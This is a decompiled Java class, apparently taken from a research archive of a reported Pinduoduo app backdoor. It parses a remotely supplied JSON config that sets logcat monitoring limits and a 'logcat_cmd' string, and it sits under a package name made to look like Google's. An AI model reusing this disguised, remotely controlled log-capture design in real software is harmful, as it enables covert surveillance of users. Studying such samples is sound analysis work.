package com.google.android.sd.biz_dynamic_dex.td.logcat.c.b.a;

import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.b;
import com.google.android.sd.biz_dynamic_dex.td.logcat.c.a;
import org.json.JSONObject;

public final class c {
  long a;
  
  int b;
  
  int c;
  
  String d;
  
  public static c a(String paramString) {
    try {
      if (TextUtils.isEmpty(paramString))
        return null; 
      JSONObject jSONObject = (new JSONObject(paramString)).optJSONObject("pre_catch_config");
      if (jSONObject == null)
        return null; 
      c c1 = new c();
      c1.a = jSONObject.optLong("max_monitor_time_sec", 5L);
      c1.b = jSONObject.optInt("max_monitor_page", 4);
      c1.c = jSONObject.optInt("max_monitor_line_per_page", 1000);
      c1.d = jSONObject.optString("logcat_cmd");
      return c1;
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder("obtain_pre_error_");
      stringBuilder.append(exception.getMessage());
      b.a(stringBuilder.toString());
      return null;
    } 
  }
  
  public static boolean b(String paramString) {
    try {
      if (TextUtils.isEmpty(paramString))
        return false; 
      if (a(paramString) == null)
        return false; 
      int i = a.a(paramString);
      int j = a.b(paramString);
      return (i == 0 && j == 101);
    } catch (Exception exception) {
      return false;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\2aa151e2cfa04acb8fb96e523807ca6b-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\td\logcat\c\b\a\c.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */